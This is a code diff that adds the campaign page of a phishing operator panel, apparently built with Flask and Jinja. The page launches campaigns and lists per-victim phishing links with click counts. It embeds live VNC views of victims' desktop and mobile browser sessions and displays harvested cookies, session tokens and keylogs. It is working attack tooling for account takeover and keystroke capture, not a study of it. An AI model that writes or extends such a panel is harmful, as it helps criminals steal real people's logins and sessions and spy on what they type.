@@ -1,0 +1,286 @@
+{% extends "base.html" %}
+{% block title %}{{ campaign.name }} - Panel{% endblock %}
+{% block content %}
+<div class="page-header">
+    <h1>{{ campaign.name }}</h1>
+    <div class="header-actions">
+        <span class="badge badge-{{ campaign.status }}" id="status-badge">{{ campaign.status }}</span>
+        {% if campaign.status == 'created' %}
+        <form method="POST" action="{{ url_for('campaigns.launch', campaign_id=campaign.id) }}" style="display:inline">
+            <button type="submit" class="btn btn-primary">Launch</button>
+        </form>
+        {% elif campaign.status == 'running' %}
+        <form method="POST" action="{{ url_for('campaigns.stop', campaign_id=campaign.id) }}" style="display:inline">
+            <button type="submit" class="btn btn-danger">Stop</button>
+        </form>
+        {% endif %}
+        <form method="POST" action="{{ url_for('campaigns.delete', campaign_id=campaign.id) }}" style="display:inline" onsubmit="return confirm('Delete this campaign?')">
+            <button type="submit" class="btn btn-danger">Delete</button>
+        </form>
+    </div>
+</div>
+
+<div class="detail-grid">
+    <div class="detail-card">
+        <h3>Configuration</h3>
+        <table class="detail-table">
+            <tr><td>Domain</td><td>{{ campaign.domain }}</td></tr>
+            <tr><td>Target</td><td>{{ campaign.target }}</td></tr>
+            <tr><td>Users</td><td>{{ campaign.num_users }}</td></tr>
+            <tr><td>Browser</td><td>{{ campaign.browser|default('firefox')|capitalize }}</td></tr>
+            <tr><td>SSL</td><td>{{ 'Yes' if campaign.ssl else 'No' }}</td></tr>
+            <tr><td>Admin Password</td><td><code>{{ campaign.admin_password }}</code></td></tr>
+        </table>
+    </div>
+
+    <div class="detail-card">
+        <h3>Quick Stats</h3>
+        <div class="mini-stats" id="mini-stats">
+            <div><span id="cookie-count">--</span> Cookies</div>
+            <div><span id="session-count">--</span> Sessions</div>
+            <div><span id="container-count">{{ users|length * 2 }}</span> Containers</div>
+        </div>
+        {% if campaign.status == 'running' %}
+        <button class="btn btn-sm" onclick="triggerCollect()">Collect Now</button>
+        {% endif %}
+    </div>
+</div>
+
+<!-- Phishing Links — always visible, live-updated via API -->
+<h2>Phishing Links</h2>
+<div id="links-section">
+    {% if campaign.status == 'created' %}
+    <p style="color:#888">Links are generated when you launch the campaign. Click <strong>Launch</strong> above.</p>
+    {% else %}
+    <div class="table-wrap">
+        <table id="links-table">
+            <thead>
+                <tr><th>User</th><th>Phishing URL</th><th>Clicks</th><th>Copy</th></tr>
+            </thead>
+            <tbody id="links-tbody">
+                <tr><td colspan="4" style="color:#888">Loading...</td></tr>
+            </tbody>
+        </table>
+    </div>
+    {% endif %}
+</div>
+
+{% if users %}
+<h2>VNC Sessions</h2>
+
+<!-- Tabs -->
+<div class="tabs">
+    <button class="tab active" onclick="showTab('vnc-tab', this)">VNC Grid</button>
+    <button class="tab" onclick="showTab('cookies-tab', this)">Cookies</button>
+    <button class="tab" onclick="showTab('sessions-tab', this)">Sessions</button>
+    <button class="tab" onclick="showTab('keylogs-tab', this)">Keylogs</button>
+</div>
+
+<div id="vnc-tab" class="tab-content active">
+    <div class="vnc-grid">
+        {% for u in users %}
+        <!-- Desktop VNC -->
+        <div class="vnc-card">
+            <div class="vnc-header">
+                <span>User {{ u.user_num }} — Desktop</span>
+                <span class="badge badge-{{ u.status }}" id="status-d-{{ u.user_num }}">{{ u.status }}</span>
+            </div>
+            {% if campaign.status == 'running' and u.vnc_password %}
+            <iframe class="vnc-iframe"
+                src="/{{ u.vnc_password }}/conn.html?path=/{{ u.vnc_password }}/websockify&password={{ u.vnc_password }}&autoconnect=true&resize=remote&view_only=true"
+                sandbox="allow-same-origin allow-scripts allow-popups"></iframe>
+            <div class="vnc-actions">
+                <a class="btn btn-sm"
+                   href="/{{ u.vnc_password }}/conn.html?path=/{{ u.vnc_password }}/websockify&password={{ u.vnc_password }}&autoconnect=true&resize=remote"
+                   target="_blank">Full View</a>
+                <button class="btn btn-sm btn-danger" onclick="disconnectUser({{ campaign.id }}, {{ u.user_num }})">Disconnect</button>
+            </div>
+            {% else %}
+            <div class="vnc-placeholder">Not running</div>
+            {% endif %}
+        </div>
+
+        <!-- Mobile VNC -->
+        <div class="vnc-card">
+            <div class="vnc-header">
+                <span>User {{ u.user_num }} — Mobile</span>
+                <span class="badge badge-{{ u.status }}" id="status-m-{{ u.user_num }}">{{ u.status }}</span>
+            </div>
+            {% if campaign.status == 'running' and u.mvnc_password %}
+            <iframe class="vnc-iframe"
+                src="/{{ u.mvnc_password }}/conn.html?path=/{{ u.mvnc_password }}/websockify&password={{ u.mvnc_password }}&autoconnect=true&resize=scale&view_only=true"
+                sandbox="allow-same-origin allow-scripts allow-popups"></iframe>
+            <div class="vnc-actions">
+                <a class="btn btn-sm"
+                   href="/{{ u.mvnc_password }}/conn.html?path=/{{ u.mvnc_password }}/websockify&password={{ u.mvnc_password }}&autoconnect=true&resize=scale"
+                   target="_blank">Full View</a>
+            </div>
+            {% else %}
+            <div class="vnc-placeholder">Not running</div>
+            {% endif %}
+        </div>
+        {% endfor %}
+    </div>
+</div>
+
+<div id="cookies-tab" class="tab-content">
+    <div id="cookies-list" class="data-list">Click the Cookies tab to load.</div>
+</div>
+
+<div id="sessions-tab" class="tab-content">
+    <div id="sessions-list" class="data-list">Click the Sessions tab to load.</div>
+</div>
+
+<div id="keylogs-tab" class="tab-content">
+    <div id="keylogs-list" class="data-list">Click the Keylogs tab to load.</div>
+</div>
+{% endif %}
+
+{% endblock %}
+{% block extra_js %}
+<script>
+const CAMPAIGN_ID = {{ campaign.id }};
+const CAMPAIGN_STATUS = "{{ campaign.status }}";
+
+/* ── Tab switching ─────────────────────────────────────────── */
+function showTab(tabId, btn) {
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.getElementById(tabId).classList.add('active');
+    btn.classList.add('active');
+    if (tabId === 'cookies-tab')  loadCookies();
+    if (tabId === 'sessions-tab') loadCookies();
+    if (tabId === 'keylogs-tab')  loadKeylogs();
+}
+
+/* ── Copy URL ──────────────────────────────────────────────── */
+function copyUrl(elementId) {
+    var el = document.getElementById(elementId);
+    if (!el) return;
+    var text = el.textContent.trim();
+    var btn = el.parentElement.parentElement.querySelector('.copy-btn');
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(() => flashCopied(btn, el));
+    } else {
+        var ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.cssText = 'position:fixed;left:-9999px;top:0';
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        flashCopied(btn, el);
+    }
+}
+function flashCopied(btn, el) {
+    if (btn) { var orig = btn.textContent; btn.textContent = 'Copied!'; setTimeout(() => btn.textContent = orig, 1200); }
+    if (el)  { el.style.background = 'rgba(46,204,113,0.25)'; setTimeout(() => el.style.background = '', 900); }
+}
+
+/* ── Links table — live polling ────────────────────────────── */
+function loadLinks() {
+    fetch('/api/campaigns/' + CAMPAIGN_ID + '/links')
+        .then(r => r.json())
+        .then(data => {
+            var tbody = document.getElementById('links-tbody');
+            if (!tbody) return;
+            var links = data.links || [];
+            if (!links.length) {
+                tbody.innerHTML = '<tr><td colspan="4" style="color:#888">No links yet — campaign may still be launching.</td></tr>';
+                return;
+            }
+            var html = '';
+            links.forEach(function(l) {
+                html += '<tr>' +
+                    '<td>User ' + l.user_num + '</td>' +
+                    '<td style="word-break:break-all"><code id="link-' + l.id + '" style="font-size:0.82em;user-select:all">' + l.url + '</code></td>' +
+                    '<td id="clicks-' + l.id + '" style="text-align:center">' + l.click_count + '</td>' +
+                    '<td><button class="btn btn-sm copy-btn" onclick="copyUrl(\'link-' + l.id + '\')">Copy</button></td>' +
+                    '</tr>';
+            });
+            tbody.innerHTML = html;
+        })
+        .catch(() => {});
+}
+
+/* ── Disconnect user ───────────────────────────────────────── */
+function disconnectUser(cid, uid) {
+    if (!confirm('Disconnect user ' + uid + '?')) return;
+    fetch('/api/campaigns/' + cid + '/users/' + uid + '/disconnect', {method: 'POST'})
+        .then(r => r.json())
+        .then(d => { alert(d.message); location.reload(); });
+}
+
+/* ── Collect now ───────────────────────────────────────────── */
+function triggerCollect() {
+    fetch('/api/campaigns/' + CAMPAIGN_ID + '/collect', {method: 'POST'})
+        .then(r => r.json())
+        .then(d => alert(d.message || d.error));
+}
+
+/* ── Cookies / Sessions ────────────────────────────────────── */
+function loadCookies() {
+    fetch('/api/campaigns/' + CAMPAIGN_ID + '/cookies')
+        .then(r => r.json())
+        .then(data => {
+            var cookies = data.cookies || [];
+            var cList = cookies.filter(c => c.source === 'cookie');
+            var sList = cookies.filter(c => c.source === 'session');
+            document.getElementById('cookies-list').innerHTML  = renderCookieTable(cList);
+            document.getElementById('sessions-list').innerHTML = renderCookieTable(sList);
+        });
+}
+function renderCookieTable(cookies) {
+    if (!cookies.length) return '<p style="color:#888">No data collected yet.</p>';
+    var html = '<table><thead><tr><th>Source</th><th>Name</th><th>Value</th><th>Host</th><th>Path</th></tr></thead><tbody>';
+    cookies.forEach(c => {
+        html += '<tr><td>' + (c.phis||'') + '</td><td>' + (c.name||'') + '</td>' +
+                '<td class="truncate">' + (c.value||'') + '</td>' +
+                '<td>' + (c.host||'') + '</td><td>' + (c.path||'') + '</td></tr>';
+    });
+    return html + '</tbody></table>';
+}
+
+/* ── Keylogs ───────────────────────────────────────────────── */
+function loadKeylogs() {
+    fetch('/api/campaigns/' + CAMPAIGN_ID + '/keylogs')
+        .then(r => r.json())
+        .then(data => {
+            var keylogs = data.keylogs || [];
+            if (!keylogs.length) {
+                document.getElementById('keylogs-list').innerHTML = '<p style="color:#888">No keylogs yet.</p>';
+                return;
+            }
+            var html = '';
+            keylogs.forEach(k => {
+                html += '<div class="keylog-entry"><h4>User ' + k.user_num +
+                        (k.is_mobile ? ' (Mobile)' : ' (Desktop)') + '</h4>' +
+                        '<pre>' + (k.content || '') + '</pre></div>';
+            });
+            document.getElementById('keylogs-list').innerHTML = html;
+        });
+}
+
+/* ── Stats + links auto-refresh ────────────────────────────── */
+function refreshStats() {
+    fetch('/api/campaigns/' + CAMPAIGN_ID + '/status')
+        .then(r => r.json())
+        .then(data => {
+            document.getElementById('cookie-count').textContent  = data.cookie_count  || 0;
+            document.getElementById('session-count').textContent = data.session_count || 0;
+        })
+        .catch(() => {});
+}
+
+/* Always load links on page load (works for running + stopped) */
+if (CAMPAIGN_STATUS !== 'created') {
+    loadLinks();
+}
+
+if (CAMPAIGN_STATUS === 'running') {
+    refreshStats();
+    setInterval(refreshStats, 8000);
+    setInterval(loadLinks, 8000);   /* live click count updates */
+}
+</script>
+{% endblock %}
